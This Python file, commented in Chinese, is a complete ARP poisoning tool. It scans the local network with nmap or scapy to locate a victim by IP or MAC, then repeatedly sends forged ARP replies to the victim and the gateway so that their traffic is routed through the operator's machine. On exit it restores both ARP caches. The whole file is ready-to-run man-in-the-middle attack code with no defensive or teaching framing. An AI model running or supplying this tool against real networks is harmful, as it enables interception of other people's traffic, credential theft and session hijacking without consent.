import argparse
from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp, conf
import time
import sys
import subprocess
import shutil
import re


def get_self_mac(iface):
    """获取本机网卡MAC地址"""
    return get_if_hwaddr(iface)


def normalize_mac(mac):
    return mac.lower().replace("-", ":")


def resolve_ip_by_mac_nmap(target_mac, scan_cidr):
    """使用 nmap -sn 进行快速且可靠的设备发现"""
    target_mac = normalize_mac(target_mac)
    print(f"[*] 正在通过 nmap 扫描 {scan_cidr} ...")
    
    try:
        # 运行 nmap -sn (Ping scan, 在局域网内作为 root 会自动使用 ARP)
        result = subprocess.run(
            ["nmap", "-sn", scan_cidr],
            capture_output=True,
            text=True,
            check=True
        )
        output = result.stdout
        
        # 解析 nmap 输出
        # nmap 输出通常包含: 
        # Nmap scan report for 192.168.1.1
        # Host is up (0.0010s latency).
        # MAC Address: D4:94:00:37:CF:C5 (TP-Link)
        
        sections = output.split("Nmap scan report for ")
        found_devices = []
        for section in sections[1:]:
            lines = section.strip().split("\n")
            ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", lines[0])
            if not ip_match:
                continue
            ip = ip_match.group(1)
            
            mac = None
            for line in lines:
                if "MAC Address:" in line:
                    mac_match = re.search(r"(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))", line)
                    if mac_match:
                        mac = normalize_mac(mac_match.group(1))
                        break
            
            if mac:
                found_devices.append((ip, mac))
                if mac == target_mac:
                    return ip, found_devices
                    
        return None, found_devices
    except Exception as e:
        print(f"[!] nmap 扫描失败: {e}")
        return None, []


def resolve_ip_by_mac(iface, target_mac, scan_cidr, timeout=5):
    target_mac = normalize_mac(target_mac)
    
    # 1. 尝试使用 nmap (更可靠)
    if shutil.which("nmap"):
        ip, devices = resolve_ip_by_mac_nmap(target_mac, scan_cidr)
        if ip:
            return ip
        if devices:
            print("[!] nmap 扫描完成，但未找到目标。发现的设备如下:")
            for dev_ip, dev_mac in devices:
                print(f"    - {dev_ip} ({dev_mac})")
            raise RuntimeError(f"未在 {scan_cidr} 找到 MAC {target_mac} 对应的 IP")

    # 2. Fallback: 使用 Scapy 分块扫描 (避免冲垮 BPF 缓冲区)
    print(f"[*] nmap 不可用或未找到目标，正在通过 Scapy 分块扫描 {scan_cidr} ...")
    
    # 将 /24 拆分为 8 个块，每块 32 个 IP
    base_net = scan_cidr.split('/')[0].rsplit('.', 1)[0]
    found_devices = []
    
    for i in range(0, 256, 32):
        chunk_ips = [f"{base_net}.{j}" for j in range(i, min(i + 32, 256))]
        answered, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=chunk_ips),
            iface=iface,
            timeout=2,
            retry=1,
            inter=0.02,
            verbose=False,
        )
        
        for _, received in answered:
            normalized_received = normalize_mac(received.hwsrc)
            found_devices.append(f"{received.psrc} ({normalized_received})")
            if normalized_received == target_mac:
                return received.psrc

    if found_devices:
        print("[!] Scapy 扫描完成，但未找到目标。发现的设备如下:")
        for dev in found_devices:
            print(f"    - {dev}")
    else:
        print("[!] 扫描完成，未发现任何在线设备。")

    raise RuntimeError(f"未在 {scan_cidr} 找到 MAC {target_mac} 对应的 IP")


def resolve_mac_by_ip(iface, target_ip, timeout=5):
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip),
        iface=iface,
        timeout=timeout,
        retry=2,
        verbose=False,
    )

    if not answered:
        raise RuntimeError(f"无法解析 {target_ip} 对应的 MAC")

    return answered[0][1].hwsrc


def build_poison_packet(target_ip, target_mac, spoof_ip, self_mac):
    """
    构建ARP欺骗包（ARP Reply）
    告诉 target_ip：spoof_ip 的 MAC 地址是 self_mac（伪造）
    """
    pkt = Ether(dst=target_mac, src=self_mac) / ARP(
        op=2,               # ARP Reply
        psrc=spoof_ip,      # 伪装的源IP（声称自己是这个IP）
        hwsrc=self_mac,     # 我的MAC（让目标把流量发给我）
        pdst=target_ip,     # 目标IP
        hwdst=target_mac    # 目标MAC
    )
    return pkt


def main():
    parser = argparse.ArgumentParser(description="ARP Poisoning Tool (ArpAttack)")
    parser.add_argument("-t", "--target-ip", help="目标 IP 地址")
    parser.add_argument("-m", "--target-mac", help="目标 MAC 地址")
    parser.add_argument("-g", "--gateway-ip", default="192.168.1.1", help="网关 IP 地址 (默认: 192.168.1.1)")
    parser.add_argument("-i", "--iface", default="en0", help="网卡名称 (默认: en0)")
    parser.add_argument("-s", "--scan-cidr", default="192.168.1.0/24", help="发现设备的扫描网段 (默认: 192.168.1.0/24)")
    parser.add_argument("--interval", type=float, default=1.0, help="发送欺骗包的间隔秒数 (默认: 1.0)")
    
    args = parser.parse_args()

    if not args.target_ip and not args.target_mac:
        parser.error("必须提供 --target-ip 或 --target-mac 其中之一")

    iface = args.iface
    self_mac = get_self_mac(iface)
    target_ip = args.target_ip
    target_mac = args.target_mac
    gateway_ip = args.gateway_ip

    print(f"[*] 启动配置:")
    print(f"    - 网卡: {iface} ({self_mac})")
    print(f"    - 网关: {gateway_ip}")
    
    try:
        # 1. 确定目标 MAC
        if not target_mac:
            print(f"[*] 正在获取 {target_ip} 的 MAC 地址...")
            target_mac = resolve_mac_by_ip(iface, target_ip)
        else:
            target_mac = normalize_mac(target_mac)

        # 2. 确定目标 IP
        if not target_ip:
            target_ip = resolve_ip_by_mac(iface, target_mac, args.scan_cidr)
        
        # 3. 确定网关 MAC
        print(f"[*] 正在获取网关 {gateway_ip} 的 MAC 地址...")
        gateway_mac = resolve_mac_by_ip(iface, gateway_ip)

    except Exception as err:
        print(f"\n[!] 错误: {err}")
        sys.exit(1)

    print(f"\n[*] 目标确认:")
    print(f"    - IP: {target_ip}")
    print(f"    - MAC: {target_mac}")
    print(f"    - 网关 MAC: {gateway_mac}")
    print()

    # 欺骗目标：告诉目标，网关的MAC是我的MAC
    pkt_to_target = build_poison_packet(
        target_ip=target_ip,
        target_mac=target_mac,
        spoof_ip=gateway_ip,
        self_mac=self_mac
    )

    # 欺骗网关：告诉网关，目标的MAC是我的MAC
    pkt_to_gateway = build_poison_packet(
        target_ip=gateway_ip,
        target_mac=gateway_mac,
        spoof_ip=target_ip,
        self_mac=self_mac
    )

    print("[*] 开始 ARP 双向欺骗攻击，按 Ctrl+C 停止...")
    count = 0
    try:
        while True:
            sendp(pkt_to_target, iface=iface, verbose=False)
            sendp(pkt_to_gateway, iface=iface, verbose=False)
            count += 1
            print(f"\r[*] 已发送 {count} 轮欺骗包", end="", flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print(f"\n\n[!] 停止攻击，共发送 {count} 轮")
        print("[*] 正在恢复目标和网关ARP缓存...")
        restore_target_pkt = Ether(dst=target_mac) / ARP(
            op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac
        )
        restore_gateway_pkt = Ether(dst=gateway_mac) / ARP(
            op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac
        )
        sendp(restore_target_pkt, iface=iface, count=3, verbose=False)
        sendp(restore_gateway_pkt, iface=iface, count=3, verbose=False)
        print("[*] 完成")


if __name__ == "__main__":
    main()
